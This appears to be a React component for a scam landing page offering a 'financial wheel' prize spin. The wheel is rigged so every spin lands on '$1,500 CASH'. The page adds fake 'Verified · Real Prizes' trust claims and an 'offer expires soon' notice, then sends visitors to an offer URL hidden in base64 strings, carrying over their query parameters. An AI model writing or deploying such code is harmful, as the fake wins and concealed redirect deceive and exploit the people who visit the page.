import { useEffect, useRef, useState } from 'react';
import './QuizWheelCredit.css';

/* ── Obfuscated offer URL (routerix.tech/direct/emp-en/) ── */
const _u = ['aHR0cHM6Ly9y', 'b3V0ZXJpeC50', 'ZWNoL2RpcmVj', 'dC9lbXAtZW4v'];
function buildOfferUrl(): string {
  const base = new URL(atob(_u.join('')));
  const incoming = new URLSearchParams(window.location.search);
  incoming.forEach((v, k) => base.searchParams.set(k, v));
  return base.toString();
}

/* ── Wheel segments (index 0 = top-right, clockwise) ── */
const SEGMENTS = [
  { label: '$2,000\nLIMIT', icon: '💳', color: '#f43f7f' },
  { label: 'CREDIT\nAPPROVED', icon: '🤝', color: '#22c55e' },
  { label: '$200\nLOAN', icon: '💵', color: '#f97316' },
  { label: '$1,000\nAPPROVED', icon: '🏦', color: '#38bdf8' },
  { label: '$50\nEXTRA', icon: '🐷', color: '#14b8a6' },
  { label: '$1,500\nCASH', icon: '💰', color: '#7c3aed' }, // index 5 — winner
];

const TOTAL = SEGMENTS.length;
const SLICE = 360 / TOTAL; // 60°

/** Compute final rotation so pointer (top) lands on segment index `winIdx` */
function calcFinalAngle(winIdx: number, currentAngle: number): number {
  // Pointer is at 12 o'clock. The wheel starts with segment 0 centred at the
  // top (offset 0°). Each segment occupies SLICE degrees clockwise.
  // To land winner at top: we need wheel rotated so that the midpoint of
  // winIdx is at 0°.
  const segMid = winIdx * SLICE + SLICE / 2; // mid of winning slice in wheel coords
  const neededExtraAngle = (360 - segMid) % 360; // extra rotation to bring it to top
  const fullSpins = 1440; // 4 full rotations
  return currentAngle + fullSpins + neededExtraAngle;
}

/* ── Confetti helper ── */
function launchConfetti(canvas: HTMLCanvasElement) {
  const ctx = canvas.getContext('2d')!;
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const pieces: {
    x: number;
    y: number;
    vx: number;
    vy: number;
    color: string;
    size: number;
    angle: number;
    spin: number;
  }[] = [];

  const colors = [
    '#7c3aed',
    '#f43f7f',
    '#22c55e',
    '#f97316',
    '#38bdf8',
    '#fbbf24',
    '#14b8a6',
  ];
  for (let i = 0; i < 180; i++) {
    pieces.push({
      x: Math.random() * canvas.width,
      y: -20,
      vx: (Math.random() - 0.5) * 6,
      vy: Math.random() * 4 + 2,
      color: colors[Math.floor(Math.random() * colors.length)],
      size: Math.random() * 10 + 5,
      angle: Math.random() * 360,
      spin: (Math.random() - 0.5) * 8,
    });
  }

  let frame: number;
  const tick = () => {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    let alive = false;
    for (const p of pieces) {
      p.x += p.vx;
      p.y += p.vy;
      p.angle += p.spin;
      p.vy += 0.12; // gravity
      if (p.y < canvas.height + 30) alive = true;
      ctx.save();
      ctx.translate(p.x, p.y);
      ctx.rotate((p.angle * Math.PI) / 180);
      ctx.fillStyle = p.color;
      ctx.globalAlpha = Math.max(0, 1 - p.y / canvas.height);
      ctx.fillRect(-p.size / 2, -p.size / 4, p.size, p.size / 2);
      ctx.restore();
    }
    if (alive) frame = requestAnimationFrame(tick);
    else ctx.clearRect(0, 0, canvas.width, canvas.height);
  };
  frame = requestAnimationFrame(tick);
  setTimeout(() => {
    cancelAnimationFrame(frame);
    ctx.clearRect(0, 0, canvas.width, canvas.height);
  }, 5000);
}

/* ── Main component ── */
type Phase = 'idle' | 'spinning' | 'won';

export default function QuizWheelCredit() {
  const [phase, setPhase] = useState<Phase>('idle');
  const [angle, setAngle] = useState(0);
  const confettiRef = useRef<HTMLCanvasElement>(null);
  const angleRef = useRef(0);

  const WIN_IDX = 5; // $1,500 CASH

  const handleSpin = () => {
    if (phase !== 'idle') return;
    setPhase('spinning');

    const finalAngle = calcFinalAngle(WIN_IDX, angleRef.current);
    angleRef.current = finalAngle;
    setAngle(finalAngle);

    // wheel CSS transition is 5s — wait then show result
    setTimeout(() => {
      setPhase('won');
      if (confettiRef.current) launchConfetti(confettiRef.current);
    }, 5200);
  };

  // keep angle ref synced
  useEffect(() => {
    angleRef.current = angle;
  }, [angle]);

  return (
    <div className="qw-page">
      {/* Confetti canvas — fullscreen overlay */}
      <canvas ref={confettiRef} className="qw-confetti" aria-hidden="true" />

      {/* Glowing bg blobs */}
      <div className="qw-blob qw-blob--tl" aria-hidden="true" />
      <div className="qw-blob qw-blob--br" aria-hidden="true" />

      <main className="qw-main">
        {/* ── Heading ── */}
        <h1 className="qw-heading">
          <span className="qw-heading-spin">Spin</span> the{' '}
          <span className="qw-heading-acc">Financial Wheel</span> and Win Prizes
        </h1>

        {/* ── Wheel container ── */}
        <div className="qw-wheel-wrap">
          {/* Pointer */}
          <div className="qw-pointer" aria-hidden="true">
            ▼
          </div>

          {/* SVG Wheel */}
          <div
            className="qw-wheel"
            style={{
              transform: `rotate(${angle}deg)`,
              transition:
                phase === 'spinning'
                  ? 'transform 5s cubic-bezier(0.17,0.67,0.12,1)'
                  : 'none',
            }}
            aria-label="Prize wheel"
            role="img"
          >
            <svg
              viewBox="0 0 400 400"
              width="400"
              height="400"
              xmlns="http://www.w3.org/2000/svg"
            >
              {SEGMENTS.map((seg, i) => {
                const startAngle = (i * SLICE - 90) * (Math.PI / 180);
                const endAngle = ((i + 1) * SLICE - 90) * (Math.PI / 180);
                const cx = 200,
                  cy = 200,
                  r = 190;

                const x1 = cx + r * Math.cos(startAngle);
                const y1 = cy + r * Math.sin(startAngle);
                const x2 = cx + r * Math.cos(endAngle);
                const y2 = cy + r * Math.sin(endAngle);

                const midAngle = startAngle + (SLICE / 2) * (Math.PI / 180);
                const labelR = r * 0.62;
                const lx = cx + labelR * Math.cos(midAngle);
                const ly = cy + labelR * Math.sin(midAngle);
                const labelDeg = i * SLICE + SLICE / 2 - 90;

                const lines = seg.label.split('\n');

                return (
                  <g key={i}>
                    {/* Slice */}
                    <path
                      d={`M ${cx} ${cy} L ${x1} ${y1} A ${r} ${r} 0 0 1 ${x2} ${y2} Z`}
                      fill={seg.color}
                      stroke="#fff"
                      strokeWidth="2"
                    />
                    {/* Icon + text rotated to mid-angle */}
                    <g transform={`rotate(${labelDeg}, ${cx}, ${cy})`}>
                      <text
                        x={lx}
                        y={ly - 20}
                        textAnchor="middle"
                        dominantBaseline="middle"
                        fontSize="26"
                        transform={`rotate(0, ${lx}, ${ly})`}
                      >
                        {seg.icon}
                      </text>
                      {lines.map((line, li) => (
                        <text
                          key={li}
                          x={lx}
                          y={ly + 8 + li * 17}
                          textAnchor="middle"
                          dominantBaseline="middle"
                          fontSize="13"
                          fontWeight="800"
                          fontFamily="Inter, system-ui, sans-serif"
                          fill="#fff"
                          letterSpacing="0.5"
                        >
                          {line}
                        </text>
                      ))}
                    </g>
                  </g>
                );
              })}

              {/* Divider lines */}
              {SEGMENTS.map((_, i) => {
                const a = (i * SLICE - 90) * (Math.PI / 180);
                return (
                  <line
                    key={i}
                    x1={200}
                    y1={200}
                    x2={200 + 190 * Math.cos(a)}
                    y2={200 + 190 * Math.sin(a)}
                    stroke="#fff"
                    strokeWidth="2"
                  />
                );
              })}

              {/* Outer ring */}
              <circle
                cx="200"
                cy="200"
                r="190"
                fill="none"
                stroke="#fff"
                strokeWidth="3"
              />
              <circle
                cx="200"
                cy="200"
                r="192"
                fill="none"
                stroke="#7c3aed"
                strokeWidth="5"
                opacity="0.6"
              />

              {/* Centre hub */}
              <circle
                cx="200"
                cy="200"
                r="30"
                fill="#fff"
                stroke="#4c1d95"
                strokeWidth="4"
              />
              <circle cx="200" cy="200" r="16" fill="#4c1d95" />
            </svg>
          </div>
        </div>

        {/* ── CTA area ── */}
        {phase !== 'won' && (
          <button
            id="qw-spin-btn"
            className={`qw-spin-btn ${phase === 'spinning' ? 'qw-spin-btn--disabled' : ''}`}
            onClick={handleSpin}
            disabled={phase === 'spinning'}
            aria-label="Spin the wheel"
          >
            {phase === 'spinning' ? (
              <span className="qw-spinning-text">
                <span className="qw-dot-loader" />
                Spinning…
              </span>
            ) : (
              '🎡 Spin Now'
            )}
          </button>
        )}

        {/* ── Win panel ── */}
        {phase === 'won' && (
          <div className="qw-win-panel" role="status" aria-live="polite">
            <div className="qw-win-badge">🎉</div>
            <p className="qw-win-label">You Won!</p>
            <p className="qw-win-prize">$1,500 CASH</p>
            <p className="qw-win-sub">Instant money prize 💸</p>
            <a
              id="qw-claim-btn"
              href={buildOfferUrl()}
              className="qw-claim-btn"
              aria-label="Claim your prize"
            >
              💰 CLAIM NOW ✅
            </a>
            <p className="qw-win-notice">
              *Offer expires soon. Click to claim.
            </p>
          </div>
        )}

        {/* ── Trust line ── */}
        {phase === 'idle' && (
          <p className="qw-trust">
            🔒 Verified &nbsp;·&nbsp; 🎁 Real Prizes &nbsp;·&nbsp; ⚡ Instant
            Results
          </p>
        )}
      </main>

      {/* ── Footer ── */}
      <footer className="qw-footer">
        <hr className="qw-divider" />
        <p className="qw-disclaimer">
          The content that follows is for informational and educational purposes
          only and does not constitute financial, legal, medical, or
          professional advice. Results are not guaranteed and may vary. Enabling
          browser notifications is optional and can be disabled at any time.
        </p>
        <p className="qw-legal-links">
          By continuing, you agree to our{' '}
          <a href="/terms" className="qw-link">
            Terms of Service
          </a>{' '}
          and{' '}
          <a href="/privacy" className="qw-link">
            Privacy Policy
          </a>
          .
        </p>
        <div className="qw-company">
          <p>© 2026 – VV7 HOLDING LLC. All rights reserved.</p>
          <p>
            <strong>Legal name:</strong> VV7 HOLDING LLC &nbsp;|&nbsp;{' '}
            <strong>Reg. No.:</strong> GB107069528
          </p>
          <p>
            <strong>Address:</strong> 1227 Sandestin Way, Orlando, FL, 32824
            &nbsp;|&nbsp;{' '}
            <a href="mailto:contact@vv7.tech" className="qw-link">
              contact@vv7.tech
            </a>
          </p>
        </div>
      </footer>
    </div>
  );
}
